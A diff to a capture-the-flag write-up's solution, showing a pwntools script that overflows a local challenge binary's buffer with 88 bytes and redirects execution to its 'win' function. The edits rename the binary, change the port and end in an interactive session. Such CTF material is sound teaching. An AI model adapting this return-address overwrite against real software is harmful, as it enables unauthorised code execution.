@@ -8,14 +8,13 @@ After inserting our name the program asks us what do we want to do, if we answer
 ## Solution
 ```py
 #!/usr/bin/env python3
-from pwn import remote, args,  process, ELF, p64, p32
+from pwn import remote, args, ELF, p64, p32
 
+elf = ELF("./unpwnable")
 if args.REMOTE:
-    r = remote('localhost', 69420) #Change host and port
+    r = remote('localhost', 1338) #Change host and port
 else:
-    r = process("./pwn2")
-
-elf = ELF("./pwn2")
+    r = elf.process()
 
 # Overwriting limit
 r.recvuntil(b':')
@@ -31,7 +30,7 @@ r.sendline(b'a'*88 + p64(elf.sym['win']))
 r.recvuntil(b'Bye!\n')
 
 #Flag!
-print(r.recvline().decode())
+r.interactive()
 ```
 
 ## Author
